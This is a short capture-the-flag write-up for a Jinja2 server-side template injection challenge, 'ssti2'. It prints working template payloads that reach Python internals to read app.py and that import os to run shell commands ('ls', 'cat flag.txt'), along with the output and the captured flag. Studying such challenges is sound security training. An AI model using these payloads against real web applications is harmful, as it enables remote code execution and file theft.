# ssti2

## What it is

Same as ssti1 but flag is not in app.py

## Solution

```_io._IOBase``` is not exactly in the same place:
```py
{{'abc'.__class__.__base__.__subclasses__()[106].__subclasses__()[0].__subclasses__()[0]('app.py').read()}}
```

https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/#rce-bypassing-as-much-as-i-possibly-can

Using the request object we can get access to the ```os``` module and do some IO.

List files in the current directory:
```py
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

Result:
```
app.py
config.py
flag.txt
index.html
```

To open ```flag.txt```:
```py
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```

flag: ```BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}```
